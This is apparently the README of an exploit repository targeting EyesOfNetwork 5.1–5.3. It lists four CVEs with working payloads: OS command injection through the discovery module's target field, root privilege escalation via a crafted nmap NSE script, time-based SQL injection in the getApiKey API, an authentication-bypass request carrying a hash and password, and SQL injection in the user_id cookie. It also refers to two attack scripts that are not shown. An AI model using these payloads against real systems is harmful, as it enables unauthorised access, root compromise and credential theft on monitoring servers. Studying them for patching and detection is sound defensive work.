# eonrce
EyesOfNetwork 5.1 to 5.3 exploits

Theses two exploit files uses the following CVE's:
| CVE_number__ | Description |
| ------------- | --- |
| CVE-2020-8654 | Discovery module to allows to run arbitrary OS commands<br>We were able to run the `id` command with the following payload in the target field : `;id #`.|
| CVE-2020-8655 | LPE via nmap NSE script<br>As the apache user is allowed to run nmap as root, we were able to execute arbitrary commands by providing a specially crafted NSE script.<br>nmap version 6.40 is used and doesn't have the `-c` and `-e` options.|
| CVE-2020-8656 | SQLi in API in getApiKey function on 'username' field<br>PoC: `/eonapi/getApiKey?username=' union select sleep(3),0,0,0,0,0,0,0 or '`<br>Auth bypass: `/eonapi/getApiKey?&username=' union select 1,'admin','1c85d47ff80b5ff2a4dd577e8e5f8e9d',0,0,1,1,8 or '&password=h4knet#`|
| CVE-2020-9465 | SQLi in API in Cookies `user_id` field<br>PoC: `Cookie: user_id=1' union select sleep(3) -- ;`|


### eonrce.py
![screenshot](eonrce53.gif)

### eonrce2.py
![screenshot](eonrce51.gif)


